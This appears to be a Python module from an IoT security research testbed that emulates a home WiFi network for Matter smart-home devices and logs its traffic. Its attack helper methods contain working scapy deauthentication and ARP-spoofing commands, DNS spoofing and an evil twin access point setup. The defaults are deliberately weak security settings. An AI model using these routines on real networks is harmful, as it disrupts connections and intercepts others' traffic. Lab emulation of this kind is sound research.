"""
VESPER WiFi Network Emulator

High-level Python API for managing the Mininet-WiFi emulated home network.
This module is the **central network layer** — every byte of IoT traffic
flows through it so we get full packet-level visibility for analysis.

Architecture:
    ┌──────────────────────────────────────────────────────────┐
    │  Habitat 3D Simulation (EventBus)                        │
    │    ↕                                                      │
    │  MatterFirmwareBridge                                     │
    │    ↕                                                      │
    │  WiFiEmulator (this module) — tracks ALL traffic          │
    │    ↕  route_to_bridge()                                   │
    │    │                                                      │
    │    ├─ Docker mode:                                        │
    │    │   exec inside station namespace → HTTP over 802.11   │
    │    │   → AP (tshark captures) → socat → matter.js bridge  │
    │    │                                                      │
    │    └─ Simulation mode:                                    │
    │        simulated latency/jitter/loss → traffic log        │
    │        → direct HTTP to matter.js bridge                  │
    │    ↕                                                      │
    │  matter.js bridge → python-matter-server → HA             │
    └──────────────────────────────────────────────────────────┘

Every REST call to the Matter bridge goes through
``WiFiEmulator.route_to_bridge()`` which:
  1. Logs the packet (src station, dst, method, path, size, latency)
  2. In Docker mode: runs curl inside the station's net namespace
     so the traffic traverses real 802.11 frames (capturable by tshark)
  3. In simulation mode: injects configurable latency / jitter / loss
     then forwards via Python requests

Usage:
    from vesper.network.wifi_emulator import WiFiEmulator

    emu = WiFiEmulator()
    emu.start()
    emu.wait_ready()

    # All Matter bridge traffic goes through the WiFi network:
    emu.route_to_bridge("kitchen-light-01", "PUT",
                        "/devices/kitchen-light-01/state",
                        {"power": "on"})

    # Attack operations
    emu.capture_start("results/attack.pcap")
    emu.deauth_station("sta1")
    emu.capture_stop()

    # Traffic analysis
    print(emu.traffic.summary())

    emu.stop()

Reference:
    Fontes, R., Afzal, S., Brito, S., Santos, M., & Rothenberg, C. E. (2015).
    "Mininet-WiFi: Emulating Software-Defined Wireless Networks."
    11th International Conference on Network and Service Management (CNSM).
"""

from __future__ import annotations

import json
import logging
import os
import random
import shutil
import socket
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ── Traffic Tracking ──────────────────────────────────────────────────────────

@dataclass
class WiFiTrafficRecord:
    """A single network packet / REST transaction routed through the WiFi."""
    timestamp: float
    src_station: str        # e.g. "sta1" or "host"
    src_ip: str
    dst_ip: str
    method: str             # "PUT", "POST", "GET", "DELETE"
    path: str               # "/devices/kitchen-light-01/state"
    request_bytes: int      # Payload size (bytes)
    response_bytes: int
    latency_ms: float       # Round-trip time
    status_code: int
    device_id: str          # Matter device ID
    success: bool
    via_wifi: bool          # True = routed through Mininet-WiFi, False = simulated


class TrafficTracker:
    """
    Central traffic log for ALL data flowing through the emulated WiFi.

    Every ``route_to_bridge()`` call creates a ``TrafficRecord``.
    This gives the paper full visibility into:
      - Total bytes transferred per device / per room / per protocol
      - Latency distribution (simulated or real)
      - Packet counts for traffic analysis (Table 5 in the paper)
      - Data for pcap correlation when Docker mode is used
    """

    def __init__(self):
        self._records: List[WiFiTrafficRecord] = []
        self._lock = __import__("threading").Lock()

    def record(self, rec: WiFiTrafficRecord) -> None:
        with self._lock:
            self._records.append(rec)

    @property
    def records(self) -> List[WiFiTrafficRecord]:
        with self._lock:
            return list(self._records)

    @property
    def total_packets(self) -> int:
        return len(self._records)

    @property
    def total_bytes(self) -> int:
        return sum(r.request_bytes + r.response_bytes for r in self._records)

    def packets_for_device(self, device_id: str) -> List[WiFiTrafficRecord]:
        return [r for r in self._records if r.device_id == device_id]

    def summary(self) -> Dict[str, Any]:
        """Return a summary dict suitable for eval results / dashboard."""
        recs = self._records
        if not recs:
            return {"total_packets": 0, "total_bytes": 0, "devices": {}}

        by_device: Dict[str, list] = {}
        for r in recs:
            by_device.setdefault(r.device_id, []).append(r)

        device_stats = {}
        for did, dev_recs in by_device.items():
            lats = [r.latency_ms for r in dev_recs]
            device_stats[did] = {
                "packets": len(dev_recs),
                "bytes": sum(r.request_bytes + r.response_bytes for r in dev_recs),
                "avg_latency_ms": sum(lats) / len(lats),
                "max_latency_ms": max(lats),
                "errors": sum(1 for r in dev_recs if not r.success),
            }

        all_lats = [r.latency_ms for r in recs]
        return {
            "total_packets": len(recs),
            "total_bytes": sum(r.request_bytes + r.response_bytes for r in recs),
            "avg_latency_ms": sum(all_lats) / len(all_lats),
            "max_latency_ms": max(all_lats),
            "total_errors": sum(1 for r in recs if not r.success),
            "via_wifi_count": sum(1 for r in recs if r.via_wifi),
            "devices": device_stats,
        }

    def clear(self) -> None:
        with self._lock:
            self._records.clear()


# ── Configuration ─────────────────────────────────────────────────────────────

class DeviceType(str, Enum):
    """IoT device types supported by the ESP32 firmware."""
    SMART_LIGHT = "smart_light"
    MOTION_SENSOR = "motion_sensor"
    TEMPERATURE_SENSOR = "temperature_sensor"
    HUMIDITY_SENSOR = "humidity_sensor"
    DOOR_SENSOR = "door_sensor"
    SMART_PLUG = "smart_plug"


@dataclass
class WiFiConfig:
    """Configuration for the emulated WiFi network.

    All WiFi and network parameters are exposed here, enabling systematic
    ablation of security configurations without code changes.  The defaults
    mirror worst-case consumer deployments (WPA2 without PMF, anonymous
    no TLS, AP isolation off).  See §3 "Configurable WiFi Parameters"
    and Table wifi-ablation for the hardening analysis.
    """
    # ── Network identity ──────────────────────────────────────────────
    ssid: str = "VESPER-IoT-Network"
    password: str = "vesper-secure-2026"
    channel: int = 6
    mode: str = "g"               # 802.11g (default) or "n" for 802.11n
    gateway_ip: str = "192.168.4.1"
    subnet: str = "192.168.4.0/24"
    matter_bridge_port: int = 8484
    num_radios: int = 10

    # ── WiFi-layer security ───────────────────────────────────────────
    encryption: str = "WPA2-PSK"  # "WPA2-PSK" (default), "WPA3-SAE", or "open"
    pmf: str = "disabled"         # "disabled" (default), "optional", or "required"
    ap_isolation: bool = False    # Drop station-to-station frames

    # ── Application-layer security ────────────────────────────────────
    matter_tls: bool = False        # Enable TLS on Matter bridge

    # ── Firewall rules ────────────────────────────────────────────────
    syn_rate_limit: int = 25      # SYN connections/s (default 25, hardened 5)
    syn_burst: int = 50           # SYN burst limit
    icmp_rate_limit: int = 10     # ICMP packets/s
    port_whitelist: Optional[List[int]] = None  # None = open; e.g. [53,67,123,8484,443]

    # ── Network simulation (used when Docker is not running) ──────────
    sim_latency_ms: float = 2.0     # Base one-way WiFi latency (ms)
    sim_jitter_ms: float = 1.0      # Random jitter ±ms
    sim_packet_loss: float = 0.0    # Probability 0.0–1.0 (0 = no loss)
    sim_bandwidth_mbps: float = 54.0  # 802.11g max


@dataclass
class DeviceConfig:
    """Configuration for a single IoT device."""
    device_id: str
    device_type: DeviceType
    label: str
    station_name: str  # Mininet-WiFi station name (e.g., "sta1")
    ip: str            # e.g., "192.168.4.10"
    serial_port: int   # QEMU serial TCP port (e.g., 5561)


# Default device fleet (matches docker-compose.yml and vesper_topology.py)
DEFAULT_DEVICES = [
    DeviceConfig("kitchen-light-01",  DeviceType.SMART_LIGHT,        "Kitchen Light",     "sta1", "192.168.4.10", 5561),
    DeviceConfig("living-room-light-01", DeviceType.SMART_LIGHT,     "Living Room Light", "sta2", "192.168.4.11", 5562),
    DeviceConfig("bedroom-light-01",  DeviceType.SMART_LIGHT,        "Bedroom Light",     "sta3", "192.168.4.12", 5563),
    DeviceConfig("motion-sensor-01",  DeviceType.MOTION_SENSOR,      "Motion Sensor",     "sta4", "192.168.4.13", 5564),
    DeviceConfig("temp-sensor-01",    DeviceType.TEMPERATURE_SENSOR, "Temp Sensor",       "sta5", "192.168.4.14", 5565),
    DeviceConfig("door-sensor-01",    DeviceType.DOOR_SENSOR,        "Door Sensor",       "sta6", "192.168.4.15", 5566),
    DeviceConfig("smart-plug-01",     DeviceType.SMART_PLUG,         "Smart Plug",        "sta7", "192.168.4.16", 5567),
    DeviceConfig("humidity-sensor-01", DeviceType.HUMIDITY_SENSOR,   "Humidity Sensor",   "sta8", "192.168.4.17", 5568),
]


class NetworkState(str, Enum):
    """State of the emulated network."""
    STOPPED = "stopped"
    STARTING = "starting"
    ROUTER_READY = "router_ready"
    DEVICES_CONNECTING = "devices_connecting"
    READY = "ready"
    ERROR = "error"


# ── Main Emulator Class ──────────────────────────────────────────────────────

class WiFiEmulator:
    """
    Manages the VESPER emulated WiFi home network.

    **Every byte of IoT traffic flows through this class** — either over
    real 802.11 frames (Docker / Mininet-WiFi mode) or through a simulated
    network layer that models latency, jitter, and packet loss.

    Call ``route_to_bridge()`` for Matter bridge REST traffic.
    It will:
      1. Log the packet in ``self.traffic`` (``TrafficTracker``)
      2. Docker mode → run curl inside the station's Mininet-WiFi namespace
         so the HTTP request traverses real 802.11 → AP → socat → bridge
         (captured by tshark)
      3. Sim mode → inject configurable latency/jitter/loss, then forward
         via Python ``requests`` to the bridge directly

    Provides a clean Python API for:
    - Starting/stopping the Docker-based WiFi topology
    - Routing traffic through the network (``route_to_bridge``)
    - Interacting with individual IoT devices (serial + Matter bridge)
    - Running attacks (deauth, MITM, DNS hijack, etc.)
    - Capturing packets (pcap via tshark)
    - Full traffic analysis (``self.traffic.summary()``)
    """

    def __init__(
        self,
        wifi_config: Optional[WiFiConfig] = None,
        devices: Optional[List[DeviceConfig]] = None,
        compose_file: Optional[str] = None,
        project_root: Optional[str] = None,
        registry=None,
    ):
        self.wifi = wifi_config or WiFiConfig()
        self.devices = devices or DEFAULT_DEVICES
        self.project_root = project_root or str(Path(__file__).resolve().parents[2])
        self.compose_file = compose_file or os.path.join(
            self.project_root, "docker", "docker-compose.yml"
        )
        self.state = NetworkState.STOPPED
        self._capture_proc: Optional[subprocess.Popen] = None
        self._registry = registry  # shared DeviceRegistry (optional)

        # ── Traffic tracker (logs every packet) ──────────────────────────
        self.traffic = TrafficTracker()

        # ── Docker detection ─────────────────────────────────────────────
        # True when vesper-router container is running — traffic goes over
        # real 802.11.  False → simulated network characteristics.
        self._docker_available = False

        # Device lookup: device_id → DeviceConfig
        self._device_map: Dict[str, DeviceConfig] = {
            d.device_id: d for d in self.devices
        }

    # ── Lifecycle ─────────────────────────────────────────────────────────

    def start(self, build: bool = False, detach: bool = True) -> None:
        """Start the full WiFi topology (router + devices)."""
        logger.info("Starting VESPER WiFi topology...")
        self.state = NetworkState.STARTING

        cmd = ["docker", "compose", "-f", self.compose_file, "up"]
        if build:
            cmd.append("--build")
        if detach:
            cmd.append("-d")

        result = subprocess.run(
            cmd, cwd=self.project_root,
            capture_output=True, text=True, timeout=300,
        )
        if result.returncode != 0:
            logger.error(f"Failed to start topology: {result.stderr}")
            self.state = NetworkState.ERROR
            raise RuntimeError(f"Docker compose failed: {result.stderr}")

        self.state = NetworkState.ROUTER_READY
        self._docker_available = True
        logger.info("Docker compose started — traffic will use real 802.11")

    def start_router_only(self) -> None:
        """Start only the WiFi router (for Python-driven experiments)."""
        logger.info("Starting VESPER WiFi router only...")
        self.state = NetworkState.STARTING

        result = subprocess.run(
            ["docker", "compose", "-f", self.compose_file, "up", "-d", "vesper-router"],
            cwd=self.project_root, capture_output=True, text=True, timeout=180,
        )
        if result.returncode != 0:
            raise RuntimeError(f"Router start failed: {result.stderr}")

        self.state = NetworkState.ROUTER_READY
        self._docker_available = True
        logger.info("Router running — traffic will use real 802.11")

    def stop(self) -> None:
        """Tear down the entire topology."""
        logger.info("Stopping VESPER WiFi topology...")
        if self._capture_proc:
            self.capture_stop()

        # Log final traffic summary
        summary = self.traffic.summary()
        if summary["total_packets"] > 0:
            logger.info(
                "Traffic summary: %d packets, %d bytes, avg %.1f ms, %d errors",
                summary["total_packets"], summary["total_bytes"],
                summary.get("avg_latency_ms", 0), summary["total_errors"],
            )

        subprocess.run(
            ["docker", "compose", "-f", self.compose_file, "down", "--timeout", "10"],
            cwd=self.project_root, capture_output=True, text=True,
        )
        self.state = NetworkState.STOPPED
        self._docker_available = False
        logger.info("Topology stopped")

    def wait_ready(self, timeout: int = 120) -> bool:
        """Wait until all devices are connected and Matter bridge is reachable."""
        logger.info("Waiting for topology to be ready...")
        self.state = NetworkState.DEVICES_CONNECTING
        deadline = time.time() + timeout

        # Wait for Matter bridge
        while time.time() < deadline:
            if self._check_matter_bridge():
                break
            time.sleep(2)
        else:
            logger.error("Matter bridge not reachable within timeout")
            self.state = NetworkState.ERROR
            return False

        # Wait for each device serial port
        for dev in self.devices:
            while time.time() < deadline:
                if self._check_serial(dev.serial_port):
                    logger.info(f"  ✓ {dev.label} ({dev.ip}) serial port {dev.serial_port} ready")
                    break
                time.sleep(2)
            else:
                logger.warning(f"  ✗ {dev.label} serial port {dev.serial_port} not ready")

        self.state = NetworkState.READY
        logger.info("Topology ready — all devices connected")
        return True

    # ── Device interaction ────────────────────────────────────────────────

    def send_serial(self, device_id: str, command: str, timeout: float = 5.0) -> str:
        """Send a command to a device via its QEMU serial port."""
        dev = self._find_device(device_id)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect(("localhost", dev.serial_port))
            sock.sendall((command + "\n").encode())
            time.sleep(0.3)
            response = sock.recv(4096).decode(errors="replace")
            sock.close()
            return response
        except Exception as e:
            logger.error(f"Serial send to {device_id} failed: {e}")
            return ""

    # ── Network-routed Matter bridge communication ────────────────────

    def route_to_bridge(
        self,
        device_id: str,
        method: str,
        path: str,
        payload: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Route an HTTP request to the Matter bridge **through the WiFi network**.

        This is the primary method for ALL Matter bridge traffic.  It ensures
        every request is tracked and (in Docker mode) traverses real 802.11.

        Args:
            device_id: Matter device ID (used to pick the right WiFi station)
            method:    HTTP method — "GET", "POST", "PUT", "DELETE"
            path:      REST path, e.g. "/devices/kitchen-light-01/state"
            payload:   JSON body (for PUT/POST)

        Returns:
            Parsed JSON response (or empty dict on error)
        """
        # Strict-mode caller check: only VirtualHub may call this (INV-4)
        import vesper.core.event_bus as _eb_mod
        if getattr(_eb_mod, "_STRICT_MODE", False):
            import inspect
            caller_names = {frame.function for frame in inspect.stack()[1:6]}
            if "_publish_matter" not in caller_names and "set_device_state" not in caller_names and "send_command" not in caller_names:
                raise RuntimeError(
                    "STRICT MODE: WiFiEmulator.route_to_bridge() called directly. "
                    "All bridge traffic must originate from VirtualHub (INV-4)."
                )

        dev = self._device_map.get(device_id)
        station = dev.station_name if dev else "host"
        src_ip = dev.ip if dev else "127.0.0.1"
        req_bytes = len(json.dumps(payload).encode()) if payload else 0

        t0 = time.time()

        if self._docker_available and dev:
            # ── Docker mode: run curl inside the station's net namespace ──
            # Traffic goes: station → 802.11 → AP → socat → matter.js bridge
            # tshark on AP captures the full HTTP exchange
            result = self._route_via_docker(dev, method, path, payload)
        else:
            # ── Simulation mode: simulated latency/jitter/loss ────────────
            result = self._route_via_sim(method, path, payload)

        latency_ms = (time.time() - t0) * 1000
        resp_bytes = len(json.dumps(result.get("body", {})).encode())

        # Log every packet in the traffic tracker
        self.traffic.record(WiFiTrafficRecord(
            timestamp=t0,
            src_station=station,
            src_ip=src_ip,
            dst_ip=self.wifi.gateway_ip,
            method=method,
            path=path,
            request_bytes=req_bytes,
            response_bytes=resp_bytes,
            latency_ms=latency_ms,
            status_code=result.get("status", 0),
            device_id=device_id,
            success=result.get("success", False),
            via_wifi=self._docker_available and dev is not None,
        ))

        return result.get("body", {})

    def _route_via_docker(
        self, dev: DeviceConfig, method: str, path: str,
        payload: Optional[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """
        Execute the HTTP request inside the station's Mininet-WiFi namespace.

        The station sends traffic over real 802.11 → AP → socat proxy → bridge.
        tshark on ``ap1-wlan1`` captures the full exchange as real WiFi frames.
        """
        gw = self.wifi.gateway_ip
        port = self.wifi.matter_bridge_port
        url = f"http://{gw}:{port}{path}"

        # Build curl command
        curl_parts = ["curl", "-s", "-o", "/dev/stdout", "-w", "\\n%{http_code}",
                       "-X", method.upper(), url,
                       "-H", "Content-Type: application/json"]
        if payload:
            curl_parts += ["-d", json.dumps(payload)]

        # Run inside the station's network namespace (via Mininet-WiFi)
        ns_cmd = f"ip netns exec {dev.station_name} {' '.join(curl_parts)}"
        try:
            raw = self._exec_in_router(ns_cmd)
            # curl -w puts http_code on last line
            lines = raw.strip().rsplit("\n", 1)
            body_str = lines[0] if len(lines) > 1 else ""
            status = int(lines[-1]) if lines[-1].isdigit() else 0
            body = json.loads(body_str) if body_str.strip() else {}
            return {"body": body, "status": status, "success": 200 <= status < 300}
        except Exception as e:
            logger.warning("Docker route failed for %s: %s", dev.device_id, e)
            return {"body": {}, "status": 0, "success": False}

    def _route_via_sim(
        self, method: str, path: str,
        payload: Optional[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """
        Simulated network: inject latency/jitter/loss, then call bridge directly.

        Used when Docker is not running (e.g. macOS development, CI tests).
        Traffic is still logged in the TrafficTracker for analysis.
        """
        # Simulate packet loss
        if random.random() < self.wifi.sim_packet_loss:
            logger.debug("Simulated packet loss on %s %s", method, path)
            return {"body": {}, "status": 0, "success": False}

        # Simulate network latency (one-way × 2 + jitter)
        delay = (self.wifi.sim_latency_ms * 2 +
                 random.uniform(-self.wifi.sim_jitter_ms, self.wifi.sim_jitter_ms))
        time.sleep(max(0, delay / 1000.0))

        # Forward to bridge via direct HTTP
        try:
            import requests as _req
            url = f"http://localhost:{self.wifi.matter_bridge_port}{path}"
            if method.upper() == "GET":
                r = _req.get(url, timeout=5)
            elif method.upper() == "POST":
                r = _req.post(url, json=payload, timeout=5)
            elif method.upper() == "PUT":
                r = _req.put(url, json=payload, timeout=5)
            elif method.upper() == "DELETE":
                r = _req.delete(url, timeout=5)
            else:
                return {"body": {}, "status": 405, "success": False}

            body = r.json() if r.content else {}
            return {"body": body, "status": r.status_code,
                    "success": 200 <= r.status_code < 300}
        except Exception as e:
            logger.error("Sim route failed: %s", e)
            return {"body": {}, "status": 0, "success": False}

    # ── Convenience wrappers (backward compat) ────────────────────────────

    def send_matter(self, device_id: str, payload: str) -> bool:
        """Send a state update via the Matter bridge, routed through WiFi."""
        try:
            data = json.loads(payload) if isinstance(payload, str) else payload
        except (json.JSONDecodeError, TypeError):
            data = {"payload": payload}
        result = self.route_to_bridge(
            device_id, "PUT",
            f"/devices/{device_id}/state", data,
        )
        return bool(result)

    def subscribe_matter(self, device_id: str, timeout: int = 5) -> Dict:
        """Get current state of a device from the Matter bridge."""
        return self.route_to_bridge(device_id, "GET", "/devices")

    # ── Packet capture ────────────────────────────────────────────────────

    def capture_start(self, output_file: str, interface: str = "any") -> None:
        """Start packet capture inside the router container."""
        logger.info(f"Starting capture → {output_file}")
        self._capture_proc = subprocess.Popen(
            [
                "docker", "exec", "vesper-router",
                "tshark", "-i", interface,
                "-w", f"/results/{os.path.basename(output_file)}",
                "-q",
            ],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

    def capture_stop(self) -> None:
        """Stop the active packet capture."""
        if self._capture_proc:
            self._capture_proc.terminate()
            try:
                self._capture_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._capture_proc.kill()
            self._capture_proc = None
            logger.info("Capture stopped")

    # ── Attack helpers ────────────────────────────────────────────────────

    def deauth_station(self, station_name: str, count: int = 5) -> str:
        """
        Send deauthentication frames to a station.
        Uses scapy inside the router container (has access to WiFi interfaces).
        """
        dev = self._find_device_by_station(station_name)
        cmd = (
            f"python3 -c \""
            f"from scapy.all import *; "
            f"dot11 = Dot11(addr1='{self._get_station_mac(station_name)}', "
            f"addr2='{self._get_ap_mac()}', addr3='{self._get_ap_mac()}'); "
            f"frame = RadioTap()/dot11/Dot11Deauth(reason=7); "
            f"sendp(frame, iface='ap1-wlan1', count={count}, inter=0.1, verbose=0); "
            f"print('DEAUTH_SENT')\""
        )
        return self._exec_in_router(cmd)

    def arp_spoof(self, target_ip: str, spoof_ip: str) -> str:
        """Send ARP spoofing packets (for MITM attacks)."""
        cmd = (
            f"python3 -c \""
            f"from scapy.all import *; "
            f"pkt = ARP(op=2, pdst='{target_ip}', psrc='{spoof_ip}'); "
            f"send(pkt, count=5, inter=0.5, verbose=0); "
            f"print('ARP_SPOOF_SENT')\""
        )
        return self._exec_in_router(cmd)

    def dns_spoof(self, domain: str, spoofed_ip: str) -> str:
        """
        Add a spoofed DNS record (via dnsmasq on the router).
        """
        cmd = f"echo 'address=/{domain}/{spoofed_ip}' >> /etc/vesper/dnsmasq-extra.conf && kill -HUP $(pidof dnsmasq)"
        return self._exec_in_router(cmd)

    def evil_twin(self, fake_ssid: Optional[str] = None) -> str:
        """
        Launch an evil twin AP using a spare mac80211_hwsim radio.
        """
        fake_ssid = fake_ssid or self.wifi.ssid
        cmd = (
            f"python3 -c \""
            f"from mn_wifi.node import AP; "
            f"import subprocess; "
            f"# Use a spare hwsim radio for the evil twin; "
            f"subprocess.run(['hostapd', '-B', '/tmp/evil_twin.conf']); "
            f"print('EVIL_TWIN_STARTED')\""
        )
        # Write evil twin hostapd config first
        self._exec_in_router(
            f"cat > /tmp/evil_twin.conf << 'EOF'\n"
            f"interface=wlan1\n"
            f"driver=nl80211\n"
            f"ssid={fake_ssid}\n"
            f"hw_mode=g\n"
            f"channel={self.wifi.channel}\n"
            f"wpa=2\n"
            f"wpa_passphrase=evil-twin-pass\n"
            f"wpa_key_mgmt=WPA-PSK\n"
            f"rsn_pairwise=CCMP\n"
            f"EOF"
        )
        return self._exec_in_router("hostapd -B /tmp/evil_twin.conf && echo EVIL_TWIN_STARTED")

    def get_topology_info(self) -> Dict[str, Any]:
        """Return full topology information."""
        return {
            "state": self.state.value,
            "wifi": {
                "ssid": self.wifi.ssid,
                "channel": self.wifi.channel,
                "gateway": self.wifi.gateway_ip,
                "subnet": self.wifi.subnet,
            },
            "matter": {
                "bridge": "localhost",
                "port": self.wifi.matter_bridge_port,
            },
            "devices": [
                {
                    "id": d.device_id,
                    "type": d.device_type.value,
                    "label": d.label,
                    "station": d.station_name,
                    "ip": d.ip,
                    "serial_port": d.serial_port,
                }
                for d in self.devices
            ],
        }

    # ── Internal helpers ──────────────────────────────────────────────────

    def _find_device(self, device_id: str) -> DeviceConfig:
        for d in self.devices:
            if d.device_id == device_id:
                return d
        raise ValueError(f"Unknown device: {device_id}")

    def _find_device_by_station(self, station_name: str) -> DeviceConfig:
        for d in self.devices:
            if d.station_name == station_name:
                return d
        raise ValueError(f"Unknown station: {station_name}")

    def _check_matter_bridge(self) -> bool:
        """Check if Matter bridge is reachable."""
        try:
            import requests
            resp = requests.get(
                f"http://localhost:{self.wifi.matter_bridge_port}/health",
                timeout=3,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def _check_serial(self, port: int) -> bool:
        """Check if a serial port is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect(("localhost", port))
            sock.close()
            return True
        except Exception:
            return False

    def _exec_in_router(self, cmd: str) -> str:
        """Execute a command inside the router container."""
        result = subprocess.run(
            ["docker", "exec", "vesper-router", "bash", "-c", cmd],
            capture_output=True, text=True, timeout=30,
        )
        return result.stdout.strip()

    def _get_station_mac(self, station_name: str) -> str:
        """Get MAC address of a Mininet-WiFi station."""
        return self._exec_in_router(
            f"python3 -c \"from mn_wifi.net import Mininet_wifi; "
            f"# MAC lookup would go here\" 2>/dev/null || "
            f"ip netns exec {station_name} cat /sys/class/net/*/address 2>/dev/null | head -1"
        )

    def _get_ap_mac(self) -> str:
        """Get the AP's MAC address."""
        return self._exec_in_router(
            "cat /sys/class/net/ap1-wlan1/address 2>/dev/null || echo 'ff:ff:ff:ff:ff:ff'"
        )
